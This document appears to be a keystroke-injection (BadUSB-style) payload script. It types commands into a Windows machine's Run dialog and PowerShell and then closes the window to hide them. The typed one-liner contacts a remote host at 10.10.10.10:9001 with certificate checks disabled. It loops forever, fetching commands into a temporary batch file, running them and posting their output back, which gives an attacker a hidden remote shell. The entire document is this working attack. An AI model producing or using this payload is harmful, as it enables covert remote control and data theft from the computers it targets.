layout("us");
typingSpeed(0,0);

press("GUI r");
delay(500);
type("powershell");
press("ENTER");
delay(500);

type("@echo off&cmd /V:ON /C SET ip=10.10.10.10:9001&&SET sid=Authorization: eb6a44aa-8acc1e56-629ea455&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1 > NUL");
press("ENTER");
delay(500);

press("ALT f4");